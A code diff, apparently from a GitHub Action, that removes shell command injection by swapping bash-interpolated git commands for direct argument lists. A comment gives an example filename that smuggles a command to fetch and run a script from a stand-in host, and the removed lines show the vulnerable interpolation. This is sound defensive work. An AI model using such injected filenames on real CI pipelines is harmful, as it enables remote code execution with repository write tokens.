@@ -55,7 +55,7 @@ async function checkFileExists(
   ref: string,
 ): Promise<boolean> {
   try {
-    await execCommand(`git cat-file -e ${ref}:${filename}`);
+    await execGit(["cat-file", "-e", `${ref}:${filename}`]);
     return true;
   } catch {
     return false;
@@ -67,9 +67,12 @@ async function getChangedLines(
   baseRef: string,
   headRef: string,
 ): Promise<number[]> {
-  const diffOutput = await execCommand(
-    `git diff ${baseRef}..${headRef} -- ${filename}`,
-  );
+  const diffOutput = await execGit([
+    "diff",
+    `${baseRef}..${headRef}`,
+    "--",
+    filename,
+  ]);
 
   const lines = diffOutput.split("\n");
   const changedLines: number[] = [];
@@ -100,16 +103,19 @@ async function getBlameData(
   ref: string,
   lookbackDays?: number,
 ): Promise<Map<number, BlameLine>> {
-  let blameCmd = `git blame --line-porcelain ${ref} -- ${filename}`;
+  const blameArgs = ["blame", "--line-porcelain"];
 
   // Add date filter if specified
   if (lookbackDays && lookbackDays > 0) {
     const since = new Date();
     since.setDate(since.getDate() - lookbackDays);
-    blameCmd += ` --since="${since.toISOString()}"`;
+    blameArgs.push(`--since=${since.toISOString()}`);
   }
 
-  const blameOutput = await execCommand(blameCmd);
+  // Options have to come before the pathspec, everything after `--` is a path.
+  blameArgs.push(ref, "--", filename);
+
+  const blameOutput = await execGit(blameArgs);
   return parseBlameOutput(blameOutput);
 }
 
@@ -156,7 +162,16 @@ function parseBlameOutput(blameOutput: string): Map<number, BlameLine> {
   return blameData;
 }
 
-async function execCommand(command: string): Promise<string> {
+/**
+ * Run git with an explicit argument list.
+ *
+ * Arguments are handed to the process directly and never go through a shell.
+ * Some of them, filenames in particular, come from the pull request and are
+ * therefore attacker controlled: a file named `a$(curl evil.sh|sh)b` would run
+ * as a command if these were interpolated into a shell string. That matters
+ * most under `pull_request_target`, where the job holds a writable token.
+ */
+async function execGit(args: string[]): Promise<string> {
   let output = "";
   let error = "";
 
@@ -173,12 +188,12 @@ async function execCommand(command: string): Promise<string> {
     ignoreReturnCode: true,
   };
 
-  const exitCode = await exec.exec("bash", ["-c", command], options);
+  const exitCode = await exec.exec("git", args, options);
 
   if (exitCode !== 0) {
     const errorMessage = error || `Command failed with exit code ${exitCode}`;
     throw new Error(
-      `Failed to execute command: ${command}\nError: ${errorMessage}`,
+      `Failed to execute command: git ${args.join(" ")}\nError: ${errorMessage}`,
     );
   }
 
